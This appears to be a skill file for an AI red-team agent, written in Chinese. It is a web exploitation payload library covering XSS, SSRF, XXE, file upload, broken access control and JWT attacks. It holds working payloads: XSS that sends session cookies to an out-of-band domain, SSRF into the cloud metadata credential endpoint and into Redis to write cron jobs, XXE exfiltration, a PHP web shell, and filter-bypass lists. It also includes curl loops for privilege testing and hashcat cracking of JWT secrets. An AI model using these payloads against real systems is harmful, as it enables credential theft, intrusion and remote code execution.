---
name: web-vuln-payloads
description: Web 载荷库：XSS / SSRF / XXE / 文件上传 / 越权 / JWT / 逻辑，含判定与绕过
whenToUse: 确认了输入点，需要按漏洞类别上载荷并拿到可复现证据时
role: exploit
enabled: true
---

# Web 载荷库（XSS / SSRF / XXE / 上传 / 越权 / JWT）

## XSS：先定位上下文，再选载荷

**① 判定反射点与上下文**（把唯一串打进去，看它落在哪）

```text
payload: xsstest123
```

| 落点 | 上下文 | 有效载荷 |
| --- | --- | --- |
| 标签之间 | HTML text | `<img src=x onerror=alert(1)>` |
| 属性内（有引号） | attr | `"><img src=x onerror=alert(1)>` |
| 属性内（无引号） | attr unquoted | ` x onerror=alert(1) class=` |
| `<script>` 内 | JS 字符串 | `'-alert(1)-'` 或 `</script><script>alert(1)</script>` |
| URL 参数 / hash | 编码后再进 | `%27-alert(1)%2d%3e` |
| JSON 回显进 DOM | 看框架是否转义 | Angular `{{7*7}}`、Vue `{{7*7}}` 先判 SSTI |

**② 过滤绕过（按顺序试，别只试一种）**

```text
大小写   <ImG sRc=x oNeRrOr=alert(1)>
双写     <scr<script>ipt>alert(1)</script>
编码     &#x6a;avascript:alert(1)   \u006aavascript:alert(1)
无括号   onerror=alert`1`   onprompt=prompt`1`
SVG      <svg/onload=alert(1)>
DOM      #a<svg/onload=alert(1)>（hash 常不进服务端）
```

**③ 证明"能打"而不是"能弹"**：`alert` 只证明可执行。要拿价值就外带 Cookie / 打后台：

```text
<script>new Image().src='//OAST_DOMAIN/c?d='+encodeURIComponent(document.cookie)</script>
```

存储型 XSS 必须**换会话/换账号再看一次**，否则你不知道它是不是只回显给你自己。

## SSRF：从内网到云元数据

```text
http://127.0.0.1:PORT/            逐端口试 6379/3306/9200/2375/8500/27017
file:///etc/passwd                部分实现支持
http://169.254.169.254/latest/meta-data/                 AWS/阿里云
http://169.254.169.254/latest/meta-data/iam/security-credentials/   拿到临时 AK/SK = 高分
gopher://127.0.0.1:6379/_<CRLF 编码的 Redis 命令>        打 Redis 写 cron / 公钥
dict://127.0.0.1:6379/info
```

**绕过 127.0.0.1 黑名单**：

```text
127.1                     0                 [::1]                 0x7f000001
127.0.0.1.nip.io          1fe80100.siphash  短域名/十六进制/八进制 0177.0.0.1
内网其它机器指向自己        302 跳转回环      http://[::]:80/
```

**判定**：响应体差异 + **外带域名回连记录**（两条都要，只有差异可能是缓存）。

## XXE

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
<!-- 外带（无回显时） -->
<!ENTITY % d SYSTEM "http://OAST_DOMAIN/%file;">
%d;<!ENTITY % s "<!ENTITY &#x25; f SYSTEM 'http://OAST_DOMAIN/x?{%s}'>"> %s; %f;
```

参数实体报错 / 空响应也可能是命中——用外带确认，不要靠猜。

## 文件上传：过三道门（扩展名 → Content-Type → 内容）

```text
双扩展名    shell.php.jpg   shell.pHp   shell.php%00.jpg   .php5 .phtml .phar
服务端覆盖  Content-Type: image/png + 真 GIF 头 + 尾部插一句话
.htaccess   AddType application/x-httpd-php .pwn     然后上传 .pwn
IIS         shell.aspx;.jpg（分号解析）              旧 IIS 6
```

一句话马（PHP）：

```php
<?php echo `$_GET[c]`; ?>              访问 /upload/shell.php?c=id
```

**必须验证解析**：上传后直接访问该文件，回显 `id` 的输出才算拿到 RCE；只上传成功 = 没打穿。

## 越权 / 未授权访问（性价比最高，先打这个）

```bash
# 水平越权：换 id 不换身份
for i in 1 2 3 100 1000; do
  curl -s -H "Authorization: Bearer $TOKEN" http://TARGET/api/users/$i | head -c 120; echo " <- $i"
done
# 垂直越权：低权 token 直接调管理接口
curl -s -o /dev/null -w '%{http_code}\n' -X POST -H "Authorization: Bearer $USER_TOKEN" \
  http://TARGET/api/admin/users
# 未授权：把 Authorization 整个摘掉
curl -s -o /dev/null -w '%{http_code}\n' http://TARGET/api/internal/config
```

判定：`200` + 真实数据 = 越权；`403` 但换方法（`POST`→`GET`、加 `X-HTTP-Method-Override`）变 `200` = 方法级绕过。

## JWT

```text
alg=none        去掉签名段，留 header.payload.
HS256 弱密钥     hashcat -m 16500 hash.txt rockyou.txt -O
RS256→HS256      把公钥当 HMAC 密钥（能读到公钥时）
kid 注入         "kid":"../../proc/self/environ"  /  SQL 拼接
```

## 失败分支

- **CSP 挡 `<script>`** → 找 `unsafe-inline` 之外的口子：JSONP 端点、`<base>` 劫持、已白名单域上的开放重定向、`nonce` 复用。
- **HTTPOnly Cookie 偷不走** → XSS 改打**同源请求**（CSRF-token 可读时直接调接口改密码 / 加管理员）。
- **SSRF 只允许 http 且禁 IP** → 域名解析到内网的公共解析服务、或 `redirect:` 302 跳转链。
- **上传目录禁执行** → 找包含点（LFI / 模板渲染）或 `.htaccess`/`web.config` 改解析规则。

## 落库要求

- 每条漏洞存**原始请求全文**（含 header、Cookie、body）与响应关键片段，不要只写结论。
- XSS 记上下文类型；SSRF 记外带域名与回连时间；越权记两个身份各自看到的字段差异。
- `redteam_chain_add`：`stage_code=exploit`，`tool` 写实际命令原文。
